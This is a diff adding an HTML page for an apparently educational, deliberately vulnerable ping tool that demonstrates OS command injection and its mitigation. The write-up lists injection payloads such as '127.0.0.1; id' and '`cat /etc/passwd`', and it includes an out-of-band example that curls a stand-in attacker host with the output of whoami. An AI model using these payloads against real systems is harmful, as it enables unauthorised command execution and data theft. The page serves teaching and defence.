@@ -1,0 +1,123 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>OS Command Injection — demo and mitigation</title>
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+  <h1>OS Command Injection — in-band variant</h1>
+  <p>A "ping a host" tool. The vulnerable version builds a shell command by string
+  concatenation; the secured version does not. Both run the same feature so the
+  same payload can be shown working, then blocked.</p>
+
+  <nav>
+    <a href="#vuln">Vulnerable</a>
+    <a href="#safe">Secured</a>
+    <a href="#writeup">Write-up</a>
+  </nav>
+
+  <div class="note">Intentionally vulnerable application. Run it on localhost only.
+  Test only this app.</div>
+
+  <h2 id="vuln">1. Vulnerable endpoint</h2>
+  <p>Enter a host to ping. Then try an injection payload, e.g.
+  <code>127.0.0.1; id</code> or <code>127.0.0.1 &amp;&amp; cat /etc/passwd</code>.</p>
+  <form onsubmit="return false">
+    <input type="text" id="vuln-in" value="127.0.0.1" autocomplete="off">
+    <button id="vuln-btn" type="submit">Ping (vulnerable)</button>
+  </form>
+  <pre id="vuln-out" class="out"></pre>
+
+  <h2 id="safe">2. Secured endpoint</h2>
+  <p>Same feature, with the mitigation applied. The exact payload that worked
+  above now fails here.</p>
+  <form onsubmit="return false">
+    <input type="text" id="safe-in" value="127.0.0.1; id" autocomplete="off">
+    <button id="safe-btn" type="submit">Ping (secured)</button>
+  </form>
+  <pre id="safe-out" class="out"></pre>
+
+  <h2 id="writeup">3. Write-up</h2>
+
+  <h3>(a) Vulnerable implementation</h3>
+  <p>In <code>server.js</code>, route <code>POST /vulnerable/ping</code>:</p>
+  <pre>const cmd = `ping -c 1 ${host}`;   // user input concatenated into a shell string
+exec(cmd, ...);                    // exec() runs this via /bin/sh -c</pre>
+
+  <h3>(b) Working exploit</h3>
+  <p>Because the string is run by a shell, shell metacharacters let the attacker
+  append commands. The output comes back in the HTTP response, which is what makes
+  this the <em>in-band</em> variant.</p>
+  <pre>127.0.0.1; id                 -&gt; runs ping, then id
+127.0.0.1 &amp;&amp; whoami           -&gt; runs whoami if ping succeeds
+127.0.0.1 | ls -la            -&gt; pipes ping output into ls
+$(uname -a)                   -&gt; command substitution
+`cat /etc/passwd`             -&gt; backtick substitution</pre>
+  <p>On Windows <code>cmd.exe</code>, use <code>&amp;</code> as the separator, e.g.
+  <code>127.0.0.1 &amp; whoami</code>.</p>
+
+  <h3>(c) Root cause</h3>
+  <p>Untrusted user input is concatenated into a command string that is then
+  interpreted by a shell. The shell treats <code>; &amp;&amp; | ` $()</code> as
+  syntax, not as data, so the attacker's text becomes new commands that run with
+  the web server process's privileges.</p>
+
+  <h3>(d) Mitigation implemented</h3>
+  <p>The secured route replaces <code>exec</code> (which spawns a shell) with
+  <code>execFile</code> and an explicit argument vector:</p>
+  <pre>execFile('ping', ['-c', '1', '--', host], ...);</pre>
+  <p>No shell is involved, so metacharacters in <code>host</code> are passed to
+  <code>ping</code> as one literal argument and are never interpreted. A payload
+  like <code>127.0.0.1; id</code> is handed to ping as a single hostname, which
+  simply fails name resolution — <code>id</code> never runs. A second layer, an
+  allow-list regex <code>/^[A-Za-z0-9.-]{1,253}$/</code>, rejects the payload
+  before execution and is the easiest "blocked attempt" screenshot for the viva.
+  The <code>--</code> stops ping from reading a value starting with <code>-</code>
+  as an option.</p>
+
+  <h3>(e) Other mitigations (theory)</h3>
+  <table>
+    <tr><th>Mitigation</th><th>Why it works</th></tr>
+    <tr>
+      <td>Avoid the shell / argument vector <em>(implemented)</em></td>
+      <td>The command binary receives arguments directly. With no shell to parse
+      them, metacharacters have no special meaning and cannot start new commands.</td>
+    </tr>
+    <tr>
+      <td>Allow-list input validation <em>(also implemented as a layer)</em></td>
+      <td>Only known-good characters/patterns (e.g. a valid hostname or IPv4) are
+      accepted; everything else is rejected. Deny-lists are avoided because they
+      are easy to bypass with an overlooked character or encoding.</td>
+    </tr>
+    <tr>
+      <td>Least privilege</td>
+      <td>Run the app as an unprivileged user, in a container or chroot with a
+      minimal filesystem and no outbound network. If injection still occurs, the
+      blast radius is contained.</td>
+    </tr>
+    <tr>
+      <td>Prefer a native library over shelling out</td>
+      <td>Use a language/library API for the task (name resolution, ICMP, file
+      ops) instead of invoking an external command at all, removing the shell
+      from the picture entirely.</td>
+    </tr>
+    <tr>
+      <td>Safe errors and output handling</td>
+      <td>Don't echo raw command output or shell errors back to the user; this
+      limits information leakage and makes blind exploitation harder.</td>
+    </tr>
+  </table>
+
+  <h3>The other variant (blind), for context</h3>
+  <p>If the app did <em>not</em> return command output, the same flaw is exploited
+  <em>blind</em>: time-based, e.g. <code>127.0.0.1; sleep 5</code> and observe the
+  delayed response; or out-of-band, e.g. <code>127.0.0.1; curl
+  http://attacker.example/$(whoami)</code> and observe the DNS/HTTP callback. Same
+  root cause, same mitigations. This project implements the in-band variant.</p>
+
+  <script src="app.js"></script>
+</body>
+</html>
